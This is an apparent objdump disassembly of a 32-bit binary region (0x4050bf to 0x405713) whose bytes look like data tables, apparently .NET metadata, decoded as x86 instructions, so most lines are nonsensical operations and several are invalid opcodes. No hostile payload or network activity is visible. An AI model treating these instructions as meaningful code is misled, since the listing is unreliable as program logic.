  4050bf:	0a b6 0a 06 00 7c    	or     0x7c00060a(%esi),%dh
  4050c5:	0b 67 0b             	or     0xb(%edi),%esp
  4050c8:	06                   	push   %es
  4050c9:	00 b2 0b 10 01 06    	add    %dh,0x601100b(%edx)
  4050cf:	00 26                	add    %ah,(%esi)
  4050d1:	0c 10                	or     $0x10,%al
  4050d3:	01 06                	add    %eax,(%esi)
  4050d5:	00 4f 0f             	add    %cl,0xf(%edi)
  4050d8:	10 01                	adc    %al,(%ecx)
  4050da:	06                   	push   %es
  4050db:	00 01                	add    %al,(%ecx)
  4050dd:	10 e2                	adc    %ah,%dl
  4050df:	0f 06                	clts
  4050e1:	00 14 10             	add    %dl,(%eax,%edx,1)
  4050e4:	e2 0f                	loop   0x4050f5
  4050e6:	06                   	push   %es
  4050e7:	00 f8                	add    %bh,%al
  4050e9:	10 e2                	adc    %ah,%dl
  4050eb:	0f 06                	clts
  4050ed:	00 f3                	add    %dh,%bl
  4050ef:	11 e1                	adc    %esp,%ecx
  4050f1:	11 06                	adc    %eax,(%esi)
  4050f3:	00 0a                	add    %cl,(%edx)
  4050f5:	12 e1                	adc    %cl,%ah
  4050f7:	11 06                	adc    %eax,(%esi)
  4050f9:	00 23                	add    %ah,(%ebx)
  4050fb:	12 e1                	adc    %cl,%ah
  4050fd:	11 06                	adc    %eax,(%esi)
  4050ff:	00 3e                	add    %bh,(%esi)
  405101:	12 e1                	adc    %cl,%ah
  405103:	11 06                	adc    %eax,(%esi)
  405105:	00 59 12             	add    %bl,0x12(%ecx)
  405108:	e1 11                	loope  0x40511b
  40510a:	06                   	push   %es
  40510b:	00 76 12             	add    %dh,0x12(%esi)
  40510e:	e1 11                	loope  0x405121
  405110:	06                   	push   %es
  405111:	00 af 12 8f 12 06    	add    %ch,0x6128f12(%edi)
  405117:	00 cf                	add    %cl,%bh
  405119:	12 8f 12 06 00 f3    	adc    -0xcfff9ee(%edi),%cl
  40511f:	12 e2                	adc    %dl,%ah
  405121:	0f 06                	clts
  405123:	00 0d 13 10 01 06    	add    %cl,0x6011013
  405129:	00 22                	add    %ah,(%edx)
  40512b:	13 e2                	adc    %edx,%esp
  40512d:	0f 06                	clts
  40512f:	00 31                	add    %dh,(%ecx)
  405131:	13 10                	adc    (%eax),%edx
  405133:	01 06                	add    %eax,(%esi)
  405135:	00 46 13             	add    %al,0x13(%esi)
  405138:	e2 0f                	loop   0x405149
  40513a:	06                   	push   %es
  40513b:	00 5c 13 e2          	add    %bl,-0x1e(%ebx,%edx,1)
  40513f:	0f 06                	clts
  405141:	00 67 13             	add    %ah,0x13(%edi)
  405144:	10 01                	adc    %al,(%ecx)
  405146:	0e                   	push   %cs
  405147:	00 a0 13 83 01 0a    	add    %ah,0xa018313(%eax)
  40514d:	00 e2                	add    %ah,%dl
  40514f:	13 4a 01             	adc    0x1(%edx),%ecx
  405152:	06                   	push   %es
  405153:	00 12                	add    %dl,(%edx)
  405155:	14 10                	adc    $0x10,%al
  405157:	01 16                	add    %edx,(%esi)
  405159:	00 4a 14             	add    %cl,0x14(%edx)
  40515c:	6a 08                	push   $0x8
  40515e:	0e                   	push   %cs
  40515f:	00 50 14             	add    %dl,0x14(%eax)
  405162:	83 01 0e             	addl   $0xe,(%ecx)
  405165:	00 79 14             	add    %bh,0x14(%ecx)
  405168:	83 01 0e             	addl   $0xe,(%ecx)
  40516b:	00 99 14 83 01 0e    	add    %bl,0xe018314(%ecx)
  405171:	00 a1 14 83 01 16    	add    %ah,0x16018314(%ecx)
  405177:	00 b1 14 6a 08 0e    	add    %dh,0xe086a14(%ecx)
  40517d:	00 c4                	add    %al,%ah
  40517f:	14 83                	adc    $0x83,%al
  405181:	01 16                	add    %edx,(%esi)
  405183:	00 8b 05 6a 08 16    	add    %cl,0x16086a05(%ebx)
  405189:	00 c5                	add    %al,%ch
  40518b:	04 6a                	add    $0x6a,%al
  40518d:	08 e7                	or     %ah,%bh
  40518f:	00 09                	add    %cl,(%ecx)
  405191:	15 00 00 06 00       	adc    $0x60000,%eax
  405196:	70 15                	jo     0x4051ad
  405198:	10 01                	adc    %al,(%ecx)
  40519a:	0e                   	push   %cs
  40519b:	00 91 15 83 01 0e    	add    %dl,0xe018315(%ecx)
  4051a1:	00 b5 15 83 01 06    	add    %dh,0x6018315(%ebp)
  4051a7:	00 d9                	add    %bl,%cl
  4051a9:	15 e1 11 16 00       	adc    $0x1611e1,%eax
  4051ae:	04 16                	add    $0x16,%al
  4051b0:	6a 08                	push   $0x8
  4051b2:	0e                   	push   %cs
  4051b3:	00 48 16             	add    %cl,0x16(%eax)
  4051b6:	83 01 0e             	addl   $0xe,(%ecx)
  4051b9:	00 97 16 83 01 0e    	add    %dl,0xe018316(%edi)
  4051bf:	00 a3 16 83 01 06    	add    %ah,0x6018316(%ebx)
  4051c5:	00 ab 16 37 08 06    	add    %ch,0x6083716(%ebx)
  4051cb:	00 22                	add    %ah,(%edx)
  4051cd:	17                   	pop    %ss
  4051ce:	0f 17 06             	movhps %xmm0,(%esi)
  4051d1:	00 37                	add    %dh,(%edi)
  4051d3:	17                   	pop    %ss
  4051d4:	10 01                	adc    %al,(%ecx)
  4051d6:	06                   	push   %es
  4051d7:	00 66 17             	add    %ah,0x17(%esi)
  4051da:	10 01                	adc    %al,(%ecx)
  4051dc:	0e                   	push   %cs
  4051dd:	00 6b 17             	add    %ch,0x17(%ebx)
  4051e0:	83 01 0a             	addl   $0xa,(%ecx)
  4051e3:	00 ff                	add    %bh,%bh
  4051e5:	17                   	pop    %ss
  4051e6:	4a                   	dec    %edx
  4051e7:	01 16                	add    %edx,(%esi)
  4051e9:	00 62 18             	add    %ah,0x18(%edx)
  4051ec:	6a 08                	push   $0x8
  4051ee:	0e                   	push   %cs
  4051ef:	00 b2 18 83 01 12    	add    %dh,0x12018318(%edx)
  4051f5:	00 fd                	add    %bh,%ch
  4051f7:	18 03                	sbb    %al,(%ebx)
  4051f9:	08 16                	or     %dl,(%esi)
  4051fb:	00 6a 19             	add    %ch,0x19(%edx)
  4051fe:	6a 08                	push   $0x8
  405200:	16                   	push   %ss
  405201:	00 78 19             	add    %bh,0x19(%eax)
  405204:	6a 08                	push   $0x8
  405206:	0e                   	push   %cs
  405207:	00 8b 19 83 01 0a    	add    %cl,0xa018319(%ebx)
  40520d:	00 cc                	add    %cl,%ah
  40520f:	19 2d 01 12 00 0b    	sbb    %ebp,0xb001201
  405215:	1a f5                	sbb    %ch,%dh
  405217:	19 06                	sbb    %eax,(%esi)
  405219:	00 8b 1a 10 01 06    	add    %cl,0x601101a(%ebx)
  40521f:	00 a3 1a 10 01 0e    	add    %ah,0xe01101a(%ebx)
  405225:	00 e4                	add    %ah,%ah
  405227:	1a 83 01 0e 00 f9    	sbb    -0x6fff1ff(%ebx),%al
  40522d:	1a 83 01 06 00 22    	sbb    0x22000601(%ebx),%al
  405233:	1b 10                	sbb    (%eax),%edx
  405235:	01 06                	add    %eax,(%esi)
  405237:	00 27                	add    %ah,(%edi)
  405239:	1b 10                	sbb    (%eax),%edx
  40523b:	01 06                	add    %eax,(%esi)
  40523d:	00 6e 1b             	add    %ch,0x1b(%esi)
  405240:	10 01                	adc    %al,(%ecx)
  405242:	06                   	push   %es
  405243:	00 8e 1b e1 11 06    	add    %cl,0x611e11b(%esi)
  405249:	00 9e 1b e1 11 06    	add    %bl,0x611e11b(%esi)
  40524f:	00 ab 1b e1 11 06    	add    %ch,0x611e11b(%ebx)
  405255:	00 b2 1b e1 11 06    	add    %dh,0x611e11b(%edx)
  40525b:	00 da                	add    %bl,%dl
  40525d:	1b 10                	sbb    (%eax),%edx
  40525f:	01 06                	add    %eax,(%esi)
  405261:	00 fa                	add    %bh,%dl
  405263:	1b 10                	sbb    (%eax),%edx
  405265:	01 06                	add    %eax,(%esi)
  405267:	00 2b                	add    %ch,(%ebx)
  405269:	1c 10                	sbb    $0x10,%al
  40526b:	01 06                	add    %eax,(%esi)
  40526d:	00 4c 1c 10          	add    %cl,0x10(%esp,%ebx,1)
  405271:	01 06                	add    %eax,(%esi)
  405273:	00 54 1c 10          	add    %dl,0x10(%esp,%ebx,1)
  405277:	01 06                	add    %eax,(%esi)
  405279:	00 63 1c             	add    %ah,0x1c(%ebx)
  40527c:	10 01                	adc    %al,(%ecx)
  40527e:	06                   	push   %es
  40527f:	00 9e 1c 8d 1c 06    	add    %bl,0x61c8d1c(%esi)
  405285:	00 ca                	add    %cl,%dl
  405287:	1c 10                	sbb    $0x10,%al
  405289:	01 06                	add    %eax,(%esi)
  40528b:	00 e0                	add    %ah,%al
  40528d:	1c 10                	sbb    $0x10,%al
  40528f:	01 06                	add    %eax,(%esi)
  405291:	00 06                	add    %al,(%esi)
  405293:	1d 8d 1c 0a 00       	sbb    $0xa1c8d,%eax
  405298:	1b 1d 2d 01 06 00    	sbb    0x6012d,%ebx
  40529e:	44                   	inc    %esp
  40529f:	1d 10 01 0a 00       	sbb    $0xa0110,%eax
  4052a4:	5f                   	pop    %edi
  4052a5:	1d 2d 01 0a 00       	sbb    $0xa012d,%eax
  4052aa:	72 1d                	jb     0x4052c9
  4052ac:	2d 01 06 00 b2       	sub    $0xb2000601,%eax
  4052b1:	1d 8d 1c 06 00       	sbb    $0x61c8d,%eax
  4052b6:	d9 1d 10 01 0a 00    	fstps  0xa0110
  4052bc:	36 1e                	ss push %ds
  4052be:	0f 1e 0a             	nopl   (%edx)
  4052c1:	00 46 1e             	add    %al,0x1e(%esi)
  4052c4:	0f 1e 06             	nopl   (%esi)
  4052c7:	00 5e 1e             	add    %bl,0x1e(%esi)
  4052ca:	8d 1c 0a             	lea    (%edx,%ecx,1),%ebx
  4052cd:	00 85 1e 2d 01 0a    	add    %al,0xa012d1e(%ebp)
  4052d3:	00 a4 1e 2d 01 06 00 	add    %ah,0x6012d(%esi,%ebx,1)
  4052da:	c8 1e 10 01          	enter  $0x101e,$0x1
  4052de:	06                   	push   %es
  4052df:	00 0c 1f             	add    %cl,(%edi,%ebx,1)
  4052e2:	10 01                	adc    %al,(%ecx)
  4052e4:	06                   	push   %es
  4052e5:	00 28                	add    %ch,(%eax)
  4052e7:	1f                   	pop    %ds
  4052e8:	10 01                	adc    %al,(%ecx)
  4052ea:	0e                   	push   %cs
  4052eb:	00 41 1f             	add    %al,0x1f(%ecx)
  4052ee:	83 01 0e             	addl   $0xe,(%ecx)
  4052f1:	00 53 1f             	add    %dl,0x1f(%ebx)
  4052f4:	83 01 06             	addl   $0x6,(%ecx)
  4052f7:	00 7a 1f             	add    %bh,0x1f(%edx)
  4052fa:	67 1f                	addr16 pop %ds
  4052fc:	06                   	push   %es
  4052fd:	00 94 1f 8a 1f 06 00 	add    %dl,0x61f8a(%edi,%ebx,1)
  405304:	b5 1f                	mov    $0x1f,%ch
  405306:	b8 01 06 00 c7       	mov    $0xc7000601,%eax
  40530b:	1f                   	pop    %ds
  40530c:	8a 1f                	mov    (%edi),%bl
  40530e:	06                   	push   %es
  40530f:	00 d4                	add    %dl,%ah
  405311:	1f                   	pop    %ds
  405312:	8a 1f                	mov    (%edi),%bl
  405314:	06                   	push   %es
  405315:	00 e9                	add    %ch,%cl
  405317:	1f                   	pop    %ds
  405318:	8a 1f                	mov    (%edi),%bl
  40531a:	12 00                	adc    (%eax),%al
  40531c:	24 20                	and    $0x20,%al
  40531e:	05 20 12 00 2a       	add    $0x2a001220,%eax
  405323:	20 05 20 12 00 30    	and    %al,0x30001220
  405329:	20 05 20 12 00 42    	and    %al,0x42001220
  40532f:	20 05 20 06 00 5d    	and    %al,0x5d000620
  405335:	20 10                	and    %dl,(%eax)
  405337:	01 12                	add    %edx,(%edx)
  405339:	00 7a 20             	add    %bh,0x20(%edx)
  40533c:	05 20 06 00 94       	add    $0x94000620,%eax
  405341:	20 10                	and    %dl,(%eax)
  405343:	01 06                	add    %eax,(%esi)
  405345:	00 b3 20 10 01 0a    	add    %dh,0xa011020(%ebx)
  40534b:	00 c1                	add    %al,%cl
  40534d:	20 2d 01 06 00 e2    	and    %ch,0xe2000601
  405353:	20 8d 1c 0a 00 f5    	and    %cl,-0xafff5e4(%ebp)
  405359:	20 2d 01 0a 00 23    	and    %ch,0x23000a01
  40535f:	21 2d 01 06 00 4a    	and    %ebp,0x4a000601
  405365:	21 8f 12 00 00 00    	and    %ecx,0x12(%edi)
  40536b:	00 01                	add    %al,(%ecx)
  40536d:	00 00                	add    %al,(%eax)
  40536f:	00 00                	add    %al,(%eax)
  405371:	00 01                	add    %al,(%ecx)
  405373:	00 01                	add    %al,(%ecx)
  405375:	00 00                	add    %al,(%eax)
  405377:	00 10                	add    %dl,(%eax)
  405379:	00 14 00             	add    %dl,(%eax,%eax,1)
  40537c:	24 00                	and    $0x0,%al
  40537e:	05 00 01 00 01       	add    $0x1000100,%eax
  405383:	00 0b                	add    %cl,(%ebx)
  405385:	01 11                	add    %edx,(%ecx)
  405387:	00 34 00             	add    %dh,(%eax,%eax,1)
  40538a:	00 00                	add    %al,(%eax)
  40538c:	09 00                	or     %eax,(%eax)
  40538e:	01 00                	add    %eax,(%eax)
  405390:	04 00                	add    $0x0,%al
  405392:	03 01                	add    (%ecx),%eax
  405394:	00 00                	add    %al,(%eax)
  405396:	40                   	inc    %eax
  405397:	00 00                	add    %al,(%eax)
  405399:	00 0d 00 06 00 04    	add    %cl,0x4000600
  40539f:	00 02                	add    %al,(%edx)
  4053a1:	01 00                	add    %eax,(%eax)
  4053a3:	00 4d 00             	add    %cl,0x0(%ebp)
  4053a6:	00 00                	add    %al,(%eax)
  4053a8:	0d 00 18 00 04       	or     $0x4001800,%eax
  4053ad:	00 02                	add    %al,(%edx)
  4053af:	00 10                	add    %dl,(%eax)
  4053b1:	00 60 00             	add    %ah,0x0(%eax)
  4053b4:	00 00                	add    %al,(%eax)
  4053b6:	05 00 21 00 04       	add    $0x4002100,%eax
  4053bb:	00 00                	add    %al,(%eax)
  4053bd:	00 10                	add    %dl,(%eax)
  4053bf:	00 69 00             	add    %ch,0x0(%ecx)
  4053c2:	24 00                	and    $0x0,%al
  4053c4:	11 00                	adc    %eax,(%eax)
  4053c6:	24 00                	and    $0x0,%al
  4053c8:	05 00 01 00 10       	add    $0x10000100,%eax
  4053cd:	00 79 00             	add    %bh,0x0(%ecx)
  4053d0:	24 00                	and    $0x0,%al
  4053d2:	05 00 28 00 1f       	add    $0x1f002800,%eax
  4053d7:	00 01                	add    %al,(%ecx)
  4053d9:	00 10                	add    %dl,(%eax)
  4053db:	00 83 00 24 00 05    	add    %al,0x5002400(%ebx)
  4053e1:	00 28                	add    %ch,(%eax)
  4053e3:	00 23                	add    %ah,(%ebx)
  4053e5:	00 01                	add    %al,(%ecx)
  4053e7:	00 10                	add    %dl,(%eax)
  4053e9:	00 8e 00 24 00 05    	add    %cl,0x5002400(%esi)
  4053ef:	00 28                	add    %ch,(%eax)
  4053f1:	00 25 00 03 00 10    	add    %ah,0x10000300
  4053f7:	00 9a 00 00 00 15    	add    %bl,0x15000000(%edx)
  4053fd:	00 28                	add    %ch,(%eax)
  4053ff:	00 29                	add    %ch,(%ecx)
  405401:	00 01                	add    %al,(%ecx)
  405403:	00 10                	add    %dl,(%eax)
  405405:	00 a8 00 24 00 15    	add    %ch,0x15002400(%eax)
  40540b:	00 2a                	add    %ch,(%edx)
  40540d:	00 2c 00             	add    %ch,(%eax,%eax,1)
  405410:	0b 01                	or     (%ecx),%eax
  405412:	10 00                	adc    %al,(%eax)
  405414:	b6 00                	mov    $0x0,%dh
  405416:	00 00                	add    %al,(%eax)
  405418:	09 00                	or     %eax,(%eax)
  40541a:	31 00                	xor    %eax,(%eax)
  40541c:	35 00 00 00 10       	xor    $0x10000000,%eax
  405421:	00 c4                	add    %al,%ah
  405423:	00 24 00             	add    %ah,(%eax,%eax,1)
  405426:	19 00                	sbb    %eax,(%eax)
  405428:	39 00                	cmp    %eax,(%eax)
  40542a:	35 00 00 00 10       	xor    $0x10000000,%eax
  40542f:	00 d1                	add    %dl,%cl
  405431:	00 24 00             	add    %ah,(%eax,%eax,1)
  405434:	1d 00 46 00 48       	sbb    $0x48004600,%eax
  405439:	00 02                	add    %al,(%edx)
  40543b:	00 10                	add    %dl,(%eax)
  40543d:	00 dc                	add    %bl,%ah
  40543f:	00 00                	add    %al,(%eax)
  405441:	00 05 00 4c 00 55    	add    %al,0x55004c00
  405447:	00 a0 00 00 00 ee    	add    %ah,-0x12000000(%eax)
  40544d:	00 24 00             	add    %ah,(%eax,%eax,1)
  405450:	00 00                	add    %al,(%eax)
  405452:	4d                   	dec    %ebp
  405453:	00 6a 00             	add    %ch,0x0(%edx)
  405456:	00 00                	add    %al,(%eax)
  405458:	10 00                	adc    %al,(%eax)
  40545a:	ff 00                	incl   (%eax)
  40545c:	24 00                	and    $0x0,%al
  40545e:	05 00 4d 00 6e       	add    $0x6e004d00,%eax
  405463:	00 03                	add    %al,(%ebx)
  405465:	01 10                	add    %edx,(%eax)
  405467:	00 f3                	add    %dh,%bl
  405469:	1c 00                	sbb    $0x0,%al
  40546b:	00 05 00 4f 00 75    	add    %al,0x75004f00
  405471:	00 06                	add    %al,(%esi)
  405473:	00 2d 02 39 00 06    	add    %ch,0x6003902
  405479:	00 34 02             	add    %dh,(%edx,%eax,1)
  40547c:	3c 00                	cmp    $0x0,%al
  40547e:	06                   	push   %es
  40547f:	00 3f                	add    %bh,(%edi)
  405481:	02 3f                	add    (%edi),%bh
  405483:	00 06                	add    %al,(%esi)
  405485:	00 4e 02             	add    %cl,0x2(%esi)
  405488:	3f                   	aas
  405489:	00 06                	add    %al,(%esi)
  40548b:	00 5d 02             	add    %bl,0x2(%ebp)
  40548e:	3c 00                	cmp    $0x0,%al
  405490:	06                   	push   %es
  405491:	06                   	push   %es
  405492:	67 02 39             	add    (%bx,%di),%bh
  405495:	00 56 80             	add    %dl,-0x80(%esi)
  405498:	6f                   	outsl  %ds:(%esi),(%dx)
  405499:	02 42 00             	add    0x0(%edx),%al
  40549c:	56                   	push   %esi
  40549d:	80 82 02 42 00 56 80 	addb   $0x80,0x56004202(%edx)
  4054a4:	91                   	xchg   %eax,%ecx
  4054a5:	02 42 00             	add    0x0(%edx),%al
  4054a8:	56                   	push   %esi
  4054a9:	80 a7 02 42 00 56 80 	andb   $0x80,0x56004202(%edi)
  4054b0:	bc 02 42 00 56       	mov    $0x56004202,%esp
  4054b5:	80 d0 02             	adc    $0x2,%al
  4054b8:	42                   	inc    %edx
  4054b9:	00 56 80             	add    %dl,-0x80(%esi)
  4054bc:	e4 02                	in     $0x2,%al
  4054be:	42                   	inc    %edx
  4054bf:	00 56 80             	add    %dl,-0x80(%esi)
  4054c2:	f3 02 42 00          	repz add 0x0(%edx),%al
  4054c6:	56                   	push   %esi
  4054c7:	80 05 03 42 00 56 80 	addb   $0x80,0x56004203
  4054ce:	16                   	push   %ss
  4054cf:	03 42 00             	add    0x0(%edx),%eax
  4054d2:	56                   	push   %esi
  4054d3:	80 28 03             	subb   $0x3,(%eax)
  4054d6:	42                   	inc    %edx
  4054d7:	00 56 80             	add    %dl,-0x80(%esi)
  4054da:	3a 03                	cmp    (%ebx),%al
  4054dc:	42                   	inc    %edx
  4054dd:	00 56 80             	add    %dl,-0x80(%esi)
  4054e0:	42                   	inc    %edx
  4054e1:	03 42 00             	add    0x0(%edx),%eax
  4054e4:	56                   	push   %esi
  4054e5:	80 54 03 42 00       	adcb   $0x0,0x42(%ebx,%eax,1)
  4054ea:	56                   	push   %esi
  4054eb:	80 68 03 42          	subb   $0x42,0x3(%eax)
  4054ef:	00 56 80             	add    %dl,-0x80(%esi)
  4054f2:	7c 03                	jl     0x4054f7
  4054f4:	42                   	inc    %edx
  4054f5:	00 56 80             	add    %dl,-0x80(%esi)
  4054f8:	98                   	cwtl
  4054f9:	03 42 00             	add    0x0(%edx),%eax
  4054fc:	06                   	push   %es
  4054fd:	06                   	push   %es
  4054fe:	67 02 39             	add    (%bx,%di),%bh
  405501:	00 56 80             	add    %dl,-0x80(%esi)
  405504:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405505:	03 9b 00 56 80 af    	add    -0x507faa00(%ebx),%ebx
  40550b:	03 9b 00 56 80 bf    	add    -0x407faa00(%ebx),%ebx
  405511:	03 9b 00 56 80 db    	add    -0x247faa00(%ebx),%ebx
  405517:	03 9b 00 56 80 eb    	add    -0x147faa00(%ebx),%ebx
  40551d:	03 9b 00 56 80 06    	add    0x6805600(%ebx),%ebx
  405523:	04 9b                	add    $0x9b,%al
  405525:	00 56 80             	add    %dl,-0x80(%esi)
  405528:	20 04 9b             	and    %al,(%ebx,%ebx,4)
  40552b:	00 56 80             	add    %dl,-0x80(%esi)
  40552e:	38 04 9b             	cmp    %al,(%ebx,%ebx,4)
  405531:	00 06                	add    %al,(%esi)
  405533:	00 4c 04 3f          	add    %cl,0x3f(%esp,%eax,1)
  405537:	00 06                	add    %al,(%esi)
  405539:	00 51 04             	add    %dl,0x4(%ecx)
  40553c:	3f                   	aas
  40553d:	00 06                	add    %al,(%esi)
  40553f:	00 5a 04             	add    %bl,0x4(%edx)
  405542:	3f                   	aas
  405543:	00 01                	add    %al,(%ecx)
  405545:	00 6e 04             	add    %ch,0x4(%esi)
  405548:	c7 00 01 00 81 04    	movl   $0x4810001,(%eax)
  40554e:	c7 00 01 00 94 04    	movl   $0x4940001,(%eax)
  405554:	3f                   	aas
  405555:	00 01                	add    %al,(%ecx)
  405557:	00 38                	add    %bh,(%eax)
  405559:	05 f5 00 06 00       	add    $0x600f5,%eax
  40555e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40555f:	07                   	pop    %es
  405560:	98                   	cwtl
  405561:	01 06                	add    %eax,(%esi)
  405563:	00 b3 07 9b 01 01    	add    %dh,0x1019b07(%ebx)
  405569:	00 f2                	add    %dh,%dl
  40556b:	07                   	pop    %es
  40556c:	c7 00 01 00 1e 07    	movl   $0x71e0001,(%eax)
  405572:	3f                   	aas
  405573:	00 01                	add    %al,(%ecx)
  405575:	00 17                	add    %dl,(%edi)
  405577:	08 a6 01 01 00 1d    	or     %ah,0x1d000101(%esi)
  40557d:	08 39                	or     %bh,(%ecx)
  40557f:	00 01                	add    %al,(%ecx)
  405581:	00 27                	add    %ah,(%edi)
  405583:	08 39                	or     %bh,(%ecx)
  405585:	00 01                	add    %al,(%ecx)
  405587:	00 30                	add    %dh,(%eax)
  405589:	08 98 01 01 00 59    	or     %bl,0x59000101(%eax)
  40558f:	08 aa 01 03 00 e6    	or     %ch,-0x19fffcff(%edx)
  405595:	08 de                	or     %bl,%dh
  405597:	01 03                	add    %eax,(%ebx)
  405599:	00 f1                	add    %dh,%cl
  40559b:	08 de                	or     %bl,%dh
  40559d:	01 03                	add    %eax,(%ebx)
  40559f:	00 06                	add    %al,(%esi)
  4055a1:	09 e2                	or     %esp,%edx
  4055a3:	01 03                	add    %eax,(%ebx)
  4055a5:	00 15 09 de 01 03    	add    %dl,0x301de09
  4055ab:	00 25 09 de 01 03    	add    %ah,0x301de09
  4055b1:	00 31                	add    %dh,(%ecx)
  4055b3:	09 39                	or     %edi,(%ecx)
  4055b5:	00 03                	add    %al,(%ebx)
  4055b7:	00 3c 09             	add    %bh,(%ecx,%ecx,1)
  4055ba:	39 00                	cmp    %eax,(%eax)
  4055bc:	03 00                	add    (%eax),%eax
  4055be:	4d                   	dec    %ebp
  4055bf:	09 39                	or     %edi,(%ecx)
  4055c1:	00 01                	add    %al,(%ecx)
  4055c3:	00 53 09             	add    %dl,0x9(%ebx)
  4055c6:	e6 01                	out    %al,$0x1
  4055c8:	06                   	push   %es
  4055c9:	00 59 09             	add    %bl,0x9(%ecx)
  4055cc:	c7 00 06 00 6e 09    	movl   $0x96e0006,(%eax)
  4055d2:	c7 00 06 00 83 09    	movl   $0x9830006,(%eax)
  4055d8:	c7 00 06 00 9a 09    	movl   $0x99a0006,(%eax)
  4055de:	c7 00 06 00 b1 09    	movl   $0x9b10006,(%eax)
  4055e4:	c7 00 06 00 c6 09    	movl   $0x9c60006,(%eax)
  4055ea:	c7 00 06 00 db 09    	movl   $0x9db0006,(%eax)
  4055f0:	c7 00 06 00 f2 09    	movl   $0x9f20006,(%eax)
  4055f6:	c7 00 06 00 09 0a    	movl   $0xa090006,(%eax)
  4055fc:	c7 00 06 00 21 0a    	movl   $0xa210006,(%eax)
  405602:	c7 00 01 00 a2 0a    	movl   $0xaa20001,(%eax)
  405608:	3f                   	aas
  405609:	00 06                	add    %al,(%esi)
  40560b:	00 24 0b             	add    %ah,(%ebx,%ecx,1)
  40560e:	36 02 01             	add    %ss:(%ecx),%al
  405611:	00 5d 0b             	add    %bl,0xb(%ebp)
  405614:	46                   	inc    %esi
  405615:	02 01                	add    (%ecx),%al
  405617:	00 64 0b 4a          	add    %ah,0x4a(%ebx,%ecx,1)
  40561b:	02 01                	add    (%ecx),%al
  40561d:	00 88 0b 4e 02 01    	add    %cl,0x1024e0b(%eax)
  405623:	00 9c 0b 4e 02 01 00 	add    %bl,0x1024e(%ebx,%ecx,1)
  40562a:	b7 0b                	mov    $0xb,%bh
  40562c:	53                   	push   %ebx
  40562d:	02 01                	add    (%ecx),%al
  40562f:	00 cc                	add    %cl,%ah
  405631:	0b 65 02             	or     0x2(%ebp),%esp
  405634:	01 00                	add    %eax,(%eax)
  405636:	d6                   	salc
  405637:	0c 4a                	or     $0x4a,%al
  405639:	02 01                	add    (%ecx),%al
  40563b:	00 36                	add    %dh,(%esi)
  40563d:	0f 98 01             	sets   (%ecx)
  405640:	01 00                	add    %eax,(%eax)
  405642:	41                   	inc    %ecx
  405643:	0f 39                	(bad)
  405645:	00 06                	add    %al,(%esi)
  405647:	00 64 0b 4a          	add    %ah,0x4a(%ebx,%ecx,1)
  40564b:	02 06                	add    (%esi),%al
  40564d:	00 17                	add    %dl,(%edi)
  40564f:	1d 4e 06 00 00       	sbb    $0x64e,%eax
  405654:	00 00                	add    %al,(%eax)
  405656:	80 00 91             	addb   $0x91,(%eax)
  405659:	20 d2                	and    %dl,%dl
  40565b:	01 13                	add    %edx,(%ebx)
  40565d:	00 01                	add    %al,(%ecx)
  40565f:	00 50 20             	add    %dl,0x20(%eax)
  405662:	00 00                	add    %al,(%eax)
  405664:	00 00                	add    %al,(%eax)
  405666:	93                   	xchg   %eax,%ebx
  405667:	00 15 02 28 00 0b    	add    %dl,0xb002802
  40566d:	00 2a                	add    %ch,(%edx)
  40566f:	21 00                	and    %eax,(%eax)
  405671:	00 00                	add    %al,(%eax)
  405673:	00 86 18 27 02 35    	add    %al,0x35022718(%esi)
  405679:	00 11                	add    %dl,(%ecx)
  40567b:	00 32                	add    %dh,(%edx)
  40567d:	21 00                	and    %eax,(%eax)
  40567f:	00 00                	add    %al,(%eax)
  405681:	00 86 18 27 02 35    	add    %al,0x35022718(%esi)
  405687:	00 11                	add    %dl,(%ecx)
  405689:	00 5b 21             	add    %bl,0x21(%ebx)
  40568c:	00 00                	add    %al,(%eax)
  40568e:	00 00                	add    %al,(%eax)
  405690:	c6                   	(bad)
  405691:	08 9d 04 cb 00 11    	or     %bl,0x1100cb04(%ebp)
  405697:	00 63 21             	add    %ah,0x21(%ebx)
  40569a:	00 00                	add    %al,(%eax)
  40569c:	00 00                	add    %al,(%eax)
  40569e:	c6                   	(bad)
  40569f:	08 b1 04 d0 00 11    	or     %dh,0x1100d004(%ecx)
  4056a5:	00 6c 21 00          	add    %ch,0x0(%ecx,%eiz,1)
  4056a9:	00 00                	add    %al,(%eax)
  4056ab:	00 c6                	add    %al,%dh
  4056ad:	08 ca                	or     %cl,%dl
  4056af:	04 d6                	add    $0xd6,%al
  4056b1:	00 12                	add    %dl,(%edx)
  4056b3:	00 77 21             	add    %dh,0x21(%edi)
  4056b6:	00 00                	add    %al,(%eax)
  4056b8:	00 00                	add    %al,(%eax)
  4056ba:	c6                   	(bad)
  4056bb:	08 d9                	or     %bl,%cl
  4056bd:	04 db                	add    $0xdb,%al
  4056bf:	00 12                	add    %dl,(%edx)
  4056c1:	00 79 21             	add    %bh,0x21(%ecx)
  4056c4:	00 00                	add    %al,(%eax)
  4056c6:	00 00                	add    %al,(%eax)
  4056c8:	c6                   	(bad)
  4056c9:	08 f4                	or     %dh,%ah
  4056cb:	04 e1                	add    $0xe1,%al
  4056cd:	00 13                	add    %dl,(%ebx)
  4056cf:	00 82 21 00 00 00    	add    %al,0x21(%edx)
  4056d5:	00 c6                	add    %al,%dh
  4056d7:	08 07                	or     %al,(%edi)
  4056d9:	05 e6 00 13 00       	add    $0x1300e6,%eax
  4056de:	84 21                	test   %ah,(%ecx)
  4056e0:	00 00                	add    %al,(%eax)
  4056e2:	00 00                	add    %al,(%eax)
  4056e4:	c6                   	(bad)
  4056e5:	08 1a                	or     %bl,(%edx)
  4056e7:	05 ec 00 14 00       	add    $0x1400ec,%eax
  4056ec:	88 21                	mov    %ah,(%ecx)
  4056ee:	00 00                	add    %al,(%eax)
  4056f0:	00 00                	add    %al,(%eax)
  4056f2:	c6                   	(bad)
  4056f3:	08 29                	or     %ch,(%ecx)
  4056f5:	05 f0 00 14 00       	add    $0x1400f0,%eax
  4056fa:	8c 21                	mov    %fs,(%ecx)
  4056fc:	00 00                	add    %al,(%eax)
  4056fe:	00 00                	add    %al,(%eax)
  405700:	c6 00 47             	movb   $0x47,(%eax)
  405703:	05 35 00 15 00       	add    $0x150035,%eax
  405708:	eb 21                	jmp    0x40572b
  40570a:	00 00                	add    %al,(%eax)
  40570c:	00 00                	add    %al,(%eax)
  40570e:	c6                   	(bad)
  40570f:	08 58 05             	or     %bl,0x5(%eax)
  405712:	cb                   	lret
  405713:	00 15 00 f3 21 00    	add    %dl,0x21f300
